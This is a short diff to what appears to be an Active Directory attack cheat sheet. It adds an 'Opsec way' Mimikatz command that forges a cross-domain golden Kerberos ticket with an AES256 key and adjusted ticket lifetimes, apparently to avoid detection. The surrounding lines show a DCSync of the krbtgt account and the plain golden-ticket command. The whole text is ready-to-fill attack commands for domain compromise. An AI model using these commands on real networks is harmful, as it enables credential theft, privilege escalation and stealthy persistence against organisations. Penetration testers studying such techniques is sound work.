@@ -1478,6 +1478,11 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"' -Computername
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /ptt"'
 ```
+ 
+- *Opsec way*
+```
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /aes256:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /startoffset:-10 /endin:600 /renewmax:10080 /ptt"'
+```
 
 #### Check access to server
 ```
